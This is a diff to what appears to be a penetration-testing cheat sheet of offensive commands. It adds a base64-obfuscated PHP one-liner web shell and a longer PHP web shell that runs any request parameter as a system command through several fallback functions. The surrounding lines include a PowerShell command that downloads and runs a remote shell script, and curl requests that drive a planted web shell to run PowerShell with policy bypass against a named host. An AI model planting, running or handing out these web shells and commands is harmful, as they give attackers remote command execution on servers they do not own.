@@ -33,6 +33,48 @@ IEX(New-Object Net.WebClient).DownloadString('http://ip/shell.ps1') # download a
 ```sh
 cp /usr/share/webshells/ # simple backdoor is good
 
+<?php $f=base64_decode('c3lzdGVt');$f($_GET['c']); ?> # obfuscated web shell
+
+<?php
+echo "<pre>";
+// Check if the parameter exists
+if (isset($_REQUEST['cmd'])) {
+    $cmd = $_REQUEST['cmd'];
+    $output = "";
+   
+    // Fallback 1: system()
+    if (function_exists('system')) {
+        ob_start();
+        system($cmd);
+        $output = ob_get_clean();
+    }
+    // Fallback 2: shell_exec()
+    elseif (function_exists('shell_exec')) {
+        $output = shell_exec($cmd);
+    }
+    // Fallback 3: passthru()
+    elseif (function_exists('passthru')) {
+        ob_start();
+        passthru($cmd);
+        $output = ob_get_clean();
+    }
+    // Fallback 4: backticks
+    elseif (function_exists('popen')) {
+        $handle = popen($cmd, 'r');
+        $output = stream_get_contents($handle);
+        pclose($handle);
+    }
+    else {
+        $output = "All execution functions are disabled!";
+    }
+   
+    echo htmlspecialchars($output);
+} else {
+    echo "Usage: ?cmd=whoami";
+}
+echo "</pre>";
+?> # even more obfuscated webshell
+
 curl -k "https://$IP/viren/ops/s.php?c=powershell+-nop+-ep+bypass+-f+C:\xampp\htdocs\viren\ops\shell.ps1"
 
 curl -sk "https://1viren.cyber.curtin.io/viren/ops/s.php" --data-urlencode "c=powershell -enc blob" -G
